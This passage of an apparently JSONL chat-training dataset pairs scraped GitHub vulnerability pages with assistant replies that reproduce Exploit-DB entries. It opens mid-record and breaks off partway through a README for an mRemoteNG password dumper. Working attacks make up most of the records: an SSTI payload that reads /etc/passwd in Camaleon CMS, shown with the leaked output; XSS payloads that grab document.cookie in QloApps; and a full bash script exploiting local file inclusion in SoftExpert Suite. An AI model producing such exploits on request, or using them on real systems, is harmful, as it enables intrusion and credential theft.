discovered to contain a Server-Side Template Injection (SSTI) vulnerability via the formats parameter.\n\nexploit\n/ruby/webapps/51489.txt\nExploit Title: Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI)\nExploit Author: PARAG BAGUL\nCVE: CVE-2023-30145\n\n## Description\nCamaleon CMS v2.7.0 was discovered to contain a Server-Side Template\nInjection (SSTI) vulnerability via the formats parameter.\n\n## Affected Component\nAll versions below 2.7.0 are affected.\n\n## Author\nParag Bagul\n\n## Steps to Reproduce\n1. Open the target URL: `https://target.com/admin/media/upload`\n2. Upload any file and intercept the request.\n3. In the `formats` parameter value, add the payload `test<%= 7*7 %>test`.\n4. Check the response. It should return the multiplication of 77 with the\nmessage \"File format not allowed (dqopi49vuuvm)\".\n\n##Detection:\n\n#Request:\n\nPOST /admin/media/upload?actions=false HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101\nFirefox/102.0\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://target.com/admin/profile/edit\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data;\nboundary=---------------------------327175120238370517612522354688\nContent-Length: 1200\nOrigin: http://target.com\nDNT: 1\nConnection: close\nCookie: cookie\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"test.txt\"\nContent-Type: text/plain\n\ntest\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"versions\"\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"thumb_size\"\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"formats\"\n\ntest<%= 7*7 %>test\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"media_formats\"\n\nimage\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"dimension\"\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"private\"\n\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"folder\"\n\n/\n-----------------------------327175120238370517612522354688\nContent-Disposition: form-data; name=\"skip_auto_crop\"\n\ntrue\n-----------------------------327175120238370517612522354688--\n\n#Response:\n\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nConnection: close\nStatus: 200 OK\nCache-Control: max-age=0, private, must-revalidate\nSet-Cookie: cookie\nContent-Length: 41\n\nFile format not allowed (test49test)\n\n#Exploitation:\n\nTo execute a command, add the following payload:\ntestqopi<%= File.open('/etc/passwd').read %>fdtest\n\nRequest:\n\nPOST /admin/media/upload?actions=true HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101\nFirefox/102.0\nAccept: /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://target.com/admin/media\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data;\nboundary=---------------------------104219633614133026962934729021\nContent-Length: 1237\nOrigin: http://target.com\nDNT: 1\nConnection: close\nCookie: cookie\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"test.txt\"\nContent-Type: text/plain\n\ntest\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"versions\"\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"thumb_size\"\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"formats\"\n\ndqopi<%= File.open('/etc/passwd').read %>fdfdsf\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"media_formats\"\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"dimension\"\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"private\"\n\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"folder\"\n\n/\n-----------------------------104219633614133026962934729021\nContent-Disposition: form-data; name=\"skip_auto_crop\"\n\ntrue\n-----------------------------104219633614133026962934729021--\n\nResponse:\n\nResponse:\n\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nConnection: close\nStatus: 200 OK\nSet-Cookie: cookie\nContent-Length: 1816\n\nFile format not allowed (dqopiroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nfdfdsf)\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/ahrixia/CVE-2023-30256\n\nGitHub - ahrixia/CVE-2023-30256: QloApp 1.5.2: Vulnerable to XSS on two Parameter (email_create and back)\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        ahrixia\n \n/\n\nCVE-2023-30256\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 4\n  \n        QloApp 1.5.2: Vulnerable to XSS on two Parameter (email_create and back)\n      \n\n4\n          stars\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nahrixia/CVE-2023-30256\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History10 CommitsREADME.mdREADME.md  back-parameter-xss.pngback-parameter-xss.png  email_create-parameter-xss.pngemail_create-parameter-xss.png  View all filesRepository files navigationREADMEWebkul Qloapps 1.5.2 - Cross-Site Scripting (XSS)\nWebkul QloApps 1.5.2: Vulnerable to XSS on two Parameter (email_create and back)\nExploit - Proof of Concept (POC)\nXXS: 'back' Parameter\nPayload (Parameter back – Plain text): \n[xss onfocus=alert(1) autofocus= xss] \n\nPayload (Parameter back – URL Encoded): \n[xss%20onfocus%3dalert(1)%20autofocus%3d%20xss]\n\nFull GET Request (Parameter back): \n[http://localhost/hotelcommerce-1.5.2/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(1)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d]\nXXS: 'email_create' Parameter\nPayload (Parameter email_create – Plain text): \n[xss><img src=a onerror=alert(document.cookie)>xss] \n\nPayload (Parameter email_create – URL Encoded): \n[xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss]\n\nPOST Request (Parameter email_create) (POST REQUEST DATA ONLY): \n[controller=authentication&SubmitCreate=1&ajax=true&email_create=xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss&back=my-account&token=6c62b773f1b284ac4743871b300a0c4d]\nConfirmed on: 30 March 2023\nVendor: QloApps [https://github.com/webkul/hotelcommerce]\n   \nAbout\n\n        QloApp 1.5.2: Vulnerable to XSS on two Parameter (email_create and back)\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n4\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross Site Scripting vulnerability found in Webkil QloApps v.1.5.2 allows a remote attacker to obtain sensitive information via the back and email_create parameters in the AuthController.php file.\n\nexploit\n/php/webapps/51465.txt\n# Exploit Title: Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS)\n# Date: 15 May 2023\n# Exploit Author: Astik Rawat (ahrixia)\n# Vendor Homepage: https://qloapps.com/\n# Software Link: https://github.com/webkul/hotelcommerce\n# Version: 1.5.2\n# Tested on: Kali Linux 2022.4\n# CVE : CVE-2023-30256\n\n\nDescription:\n\nA Cross Site Scripting (XSS) vulnerability exists in Webkul Qloapps which is a free and open-source hotel reservation & online booking system written in PHP and distributed under OSL-3.0 Licence.\n\nSteps to exploit:\n1) Go to Signin page on the system.\n2) There are two parameters which can be exploited via XSS\n\t- back\n\t- email_create\n\n2.1) Insert your payload in the \"back\"- GET and POST Request\n\tProof of concept (Poc):\n\tThe following payload will allow you to execute XSS -\n\n\tPayload (Plain text):\n\txss onfocus=alert(1) autofocus= xss\n\n\tPayload (URL Encoded):\n\txss%20onfocus%3dalert(1)%20autofocus%3d%20xss\n\n\tFull GET Request (back):\n\t[http://localhost/hotelcommerce-1.5.2/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(1)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d]\n\n2.2) Insert your payload in the \"email_create\" - POST Request Only\n\tProof of concept (Poc):\n\tThe following payload will allow you to execute XSS -\n\n\tPayload (Plain text):\n\txss><img src=a onerror=alert(document.cookie)>xss\n\n\tPayload (URL Encoded):\n\txss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss\n\n\tPOST Request (email_create) (POST REQUEST DATA ONLY):\n\t[controller=authentication&SubmitCreate=1&ajax=true&email_create=xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss&back=my-account&token=6c62b773f1b284ac4743871b300a0c4d]\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/Filiplain/LFI-to-RCE-SE-Suite-2.0\n\nGitHub - Filiplain/LFI-to-RCE-SE-Suite-2.0: Authenticated Local File Inclusion to Remote Code Execution on SoftExpert Suite EQM.\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Filiplain\n \n/\n\nLFI-to-RCE-SE-Suite-2.0\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    0\n \n          Star\n 2\n  \n        Authenticated Local File Inclusion to Remote Code Execution on SoftExpert Suite EQM.\n      \n\n2\n          stars\n \n\n0\n          forks\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nFiliplain/LFI-to-RCE-SE-Suite-2.0\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History23 CommitsImagesImages  PoCPoC  README.mdREADME.md  View all filesRepository files navigationREADMERemote Code Execution in SoftExpert Excellence Suite 2.0 - CVE-2023-30330\nAuthenticated Local File Inclusion to Remote Code Execution on SoftExpert Excellence Suite EQM.\nCVE-2023-30330\n\nSE Suite 2.x versions before 2.1.3\nTested on versions: 2.0.15.31 and 2.0.15.115\n\nLFI PoC\nhttps://github.com/Filiplain/LFI-to-RCE-SE-Suite-2.0/tree/main/PoC\n\n1- Local File Inclusion:\nThe researcher was able to find a PHP function \"/se/v42300/generic/gn_defaultframe/2.0/defaultframe_filter.php\" that includes a file with extension \".inc\" in a\nbase64 encoding format through the “managerPath” parameter in a POST request. By changing the “.inc” file to for example “C:\\windows\\win.ini” and converting it back to base64, we are going to get that file on the system.\nThe PHP file \"defaultframe_filter.php\" is using the function “require_once()” to include the files, this function could allow a hacker to execute Remote Code Execution by including poisoned logs.\n\n2- Remote Code Execution:\n\nWe can include and read PHP error logs.\nWe can use require_once() to execute PHP code.\nWe need to insert PHP code into the error logs.\n\nBy analyzing the “user_action.php” function when uploading a new profile picture, we can notice\nthat when you upload an invalid or malicious image, the page will throw an error 401. After causing\nthe error you can read the logs again and see that some parameters like the “Referer” header will be\nlogged, knowing this we can inject PHP code into the “Referer” header.\n\nAfter trying to upload the malicious image and injecting PHP code into the Referer, we can confirm\nthe log poisoning by reading the logs.\n\nNow we can execute commands by reading the logs.\nCommand: whoami\n\n   \nAbout\n\n        Authenticated Local File Inclusion to Remote Code Execution on SoftExpert Suite EQM.\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n2\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n0\n      forks\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nLanguages\nShell\n100.0%\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsSoftExpert (SE) Excellence Suite 2.x versions before 2.1.3 is vulnerable to Local File Inclusion in the function /se/v42300/generic/gn_defaultframe/2.0/defaultframe_filter.php.\n\nexploit\n/php/webapps/51404.sh\n# Exploit Title: SoftExpert (SE) Suite v2.1.3 - Local File Inclusion\n# Date: 27-04-2023\n# Exploit Author: Felipe Alcantara (Filiplain)\n# Vendor Homepage: https://www.softexpert.com/\n# Version: 2.0 < 2.1.3\n# Tested on: Kali Linux\n# CVE : CVE-2023-30330\n# SE Suite versions tested: 2.0.15.31, 2.0.15.115\n\n# https://github.com/Filiplain/LFI-to-RCE-SE-Suite-2.0\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30330\n\n\n#!/bin/bash\n\n# Usage: ./lfi-poc.sh <domain> <username> <password> <File Path>\n\ntarget=$1\nu=$2\np=$3\nfile=$(echo -n \"$4\"|base64 -w 0)\n\nend=\"\\033[0m\\e[0m\"\nred=\"\\e[0;31m\\033[1m\"\nblue=\"\\e[0;34m\\033[1m\"\n\necho -e \"\\n$4 : $file\\n\"\n\necho -e \"${blue}\\nGETTING SESSION COOKIE${end}\"\ncookie=$(curl -i -s -k -X $'POST' \\\n    -H \"Host: $target\" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 213' -H \"Origin: https://$target\" -H \"Referer: https://$target/softexpert/login?page=home\" -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' \\\n    -b $'language=1; _ga=GA1.3.151610227.1675447324; SEFGLANGUAGE=1; mode=deploy' \\\n    --data-binary \"json=%7B%22AuthenticationParameter%22%3A%7B%22language%22%3A3%2C%22hashGUID%22%3Anull%2C%22domain%22%3A%22%22%2C%22accessType%22%3A%22DESKTOP%22%2C%22login%22%3A%22$u%22%2C%22password%22%3A%22$p%22%7D%7D\" \\\n    \"https://$target/softexpert/selogin\"|grep se-authentication-token |grep \"=\" |cut -d ';' -f 1|sort -u|cut -d \"=\" -f 2)\n\necho \"cookie: $cookie\"\n\nfunction LFI () {\n\ncurl -s -k -X $'POST' \\\n    -H \"Host: $target\" -H \"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\" -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H \"Origin: https://$target\" -H \"Referer: https://$target/softexpert/workspace?page=home\" -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Te: trailers' -H 'Connection: close' \\\n    -b \"se-authentication-token=$cookie; _ga=GA1.3.151610227.1675447324; SEFGLANGUAGE=1; mode=deploy\" \\\n    --data-binary \"action=4&managerName=lol&managerPath=$file&className=ZG9jX2RvY3VtZW50X2FkdmFuY2VkX2dyb3VwX2ZpbHRlcg%3D%3D&instantiate=false&loadJquery=false\" \\\n    \"https://$target/se/v42300/generic/gn_defaultframe/2.0/defaultframe_filter.php\"\n\n}\n\necho -e \"${blue}\\nExploiting LFI:${end}\"\nLFI\n\nfunction logout () {\ncurl -i -s -k -X $'POST' \\\n    -H \"Host: $target\" -H $'Content-Length: 0' -H $'Sec-Ch-Ua: \\\"Not_A Brand\\\";v=\\\"99\\\", \\\"Google Chrome\\\";v=\\\"109\\\", \\\"Chromium\\\";v=\\\"109\\\"' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'X-Requested-With: XMLHttpRequest' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' -H $'Sec-Ch-Ua-Platform: \\\"Linux\\\"' -H \"Origin: https://$target\" -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H \"Referer: https://$target/softexpert/workspace?page=home\" -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \\\n    -b \"se-authentication-token=$cookie; language=1; _ga=GA1.3.1890963078.1675081150; twk_uuid_5db840c5e4c2fa4b6bd8f89a=%7B%22uuid%22%3A%221.bJmDVb5PBlMumGNq2QO9gxk5hjdc6sp2pgENmao2hxHntg00r0qllmuXqCXTWG9uYLT1GkRDFuPY4ir63UIEJEXSS0pIJi8YlIvsB4edfrG1RTcS3CPr58feQBNf1%22%2C%22version%22%3A3%2C%22domain%22%3A%22$target%22%2C%22ts%22%3A1675081174571%7D; mode=deploy\" \\\n    \"https://$target/softexpert/selogout\"\n}\n\necho -e \"${blue}\\nLogging out${end}\"\nlogout >/dev/null\necho -e \"\\n\\nDone!\"\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper\n\nGitHub - S1lkys/CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        S1lkys\n \n/\n\nCVE-2023-30367-mRemoteNG-password-dumper\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 13\n  \n        Original PoC for CVE-2023-30367\n      \nLicense\n\n     MIT license\n    \n13\n          stars\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nS1lkys/CVE-2023-30367-mRemoteNG-password-dumper\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History53 CommitsPropertiesProperties  assetsassets  bin/Releasebin/Release  objobj  App.configApp.config  LICENSELICENSE  Program.csProgram.cs  README.mdREADME.md  mRemoteNG Dumper.csprojmRemoteNG Dumper.csproj  mRemoteNG Dumper.slnmRemoteNG Dumper.sln  mremoteng_decrypt.pymremoteng_decrypt.py  View all filesRepository files navigationREADMEMIT licensemRemoteNG <= v1.77.3.1784-NB Password Dumper (CVE-2023-30367)\nMulti-Remote Next Generation Connection Manager (mRemoteNG) is free software that enables users to store and manage multi-protocol connection configurations to remotely connect to systems.\nmRemoteNG configuration files can be stored in an encrypted state on disk. mRemoteNG version <= v1.76.20 and <= 1.77.3-dev loads configuration files in plain text into memory (after decrypting them if necessary) at application start-up, even if no connection has been established yet. This allows attackers to access contents of configuration files in plain text through a memory dump and thus compromise user credentials when no custom password encryption key has been set. This also bypasses the connection configuration file encryption setting by dumping already decrypted configurations from memory.\nThis vulnerability was assigned CVE-2023-30367.\nTested with mRemoteNG 1.77.3.1784-NB and mRemoteNG 1.76.20 on Windows 11 (German).\nFinding was confirmed by Dimitrij Gorodeckij, one of mRemoteNG's developers, here. A fix is still in development. Thanks again to Dimitrij Gorodeckij for his fast response and cooperation!  Hopefully it will be fixed soon!\nWhat can you do\n1. Use strong (long) configuration password encryption passwords/keys:\nIn case of a memory dump an attacker would gain access to configuration files in plaintext but would still have to bruteforce the passwords encryption key.\nUnfortunately, enabling the Connection file encryption option doesn't help in preventing this attack since mRemoteNG connection configuration files get decrypted at runtime.\n2. Update to mRemoteNG greater than v1.77.3.1784-NB when a fix has been released.\n3. To prevent malicious execution of e.g. mRemoteNGDumper.exe, application whitelisting should be enforced.\nNote\nPlease be aware that configuration password encryption and connection file encryption are different settings. Configuration password encryption is used to encrypt the password within the configuration file only while connection file encryption is used to encrypt the whole configuration file itself.\nThis exploit bypasses the connection file encryption by dumping already decrypted configurations from memory. These still contain encrypted passwords which can be decrypted with default key mR3m. If a custom configuration password encryption key/password has been set, an attacker would still have to guess the custom key. (See mremoteng-decrypt.py section)\nSetup\n\nInstall .NET (most major operating systems supported).\nClone the repository: git clone https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper.git or download it from GitHub\nEnter the project directory mRemoteNG-password-dumper\nOpen solution with VisualStudio and build using .Net 4.8.1\n\nThe easiest way to manually test this on Windows is to create a process dump using the windows task manager by right-clicking the mRemoteNG process and selecting \"Create dump file\".\nThe dump can be opened in VisualStudio Code. Search then for your configured connection values.\nManual Proof of Concept\n\nCreate a new connection configuration, set hostname, username and password.\nEnable disk file encryption for configuration files.\nRestart mRemoteNG\nUse Task Manager / Processhacker / Procdump or any other tool that can create minidumps of a process to create a minidump.\nExamine the minidump file and search for \"<Node Name=\" which indicates the beginning of mRemoteNGs connection configuration file.\n\nmRemoteNGDumper.exe\nmRemoteNG Password Dumper is a simple proof-of-concept tool used to dump configuration files from mremoteNG's memory. No code execution on the target system is required, just a memory dump.\nIt's a quick POC, so likely not very reliable and robust. Please create a pull request if you happen to find an issue and fix it.\nConfiguration files are currently hardcoded like this: (\\<Node)(.*)(?=\\/>)\\/>\n\nStart mRemoteNG and enter a file decryption password if 